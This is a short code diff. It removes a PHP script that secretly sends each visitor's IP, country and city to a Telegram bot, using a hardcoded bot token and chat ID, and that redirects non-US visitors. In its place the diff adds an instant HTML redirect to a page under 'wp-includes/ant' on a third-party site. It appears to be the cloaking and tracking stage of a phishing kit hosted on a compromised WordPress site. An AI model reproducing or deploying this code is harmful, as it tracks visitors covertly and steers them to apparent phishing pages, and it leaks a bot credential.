@@ -1,39 +1,8 @@
-<?php
-
-$ip = $_SERVER['REMOTE_ADDR'];
-$response = @file_get_contents("http://ip-api.com/json/".$ip);
-
-if ($response !== false) {
-
-    $details = json_decode($response);
-
-    if (!empty($details->country) && !empty($details->city)) {
-
-        $country = $details->country;
-        $city    = $details->city;
-
-        $message = "🌍 New Visit\n";
-        $message .= "Country: $country\n";
-        $message .= "City: $city\n";
-        $message .= "IP: $ip";
-
-        $token = "7779901815:AAGAqDnnOImlIb2wdMF3y9M17WpYZlFkCNc";
-        $chat_id = "7243663676";
-
-        $data = [
-            'text' => $message,
-            'chat_id' => $chat_id
-        ];
-
-        file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?" . http_build_query($data));
-
-        /* 🚫 Ila kan USA ma ndirouch redirect */
-        if ($country !== "United States") {
-            header("Location: https://niabeauty.ca/wp-includes/ant");
-            exit();
-        }
-
-    }
-}
-
-?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="0; url=https://niabeauty.ca/wp-includes/ant/export.php">
+</head>
+<body>
+</body>
+</html>
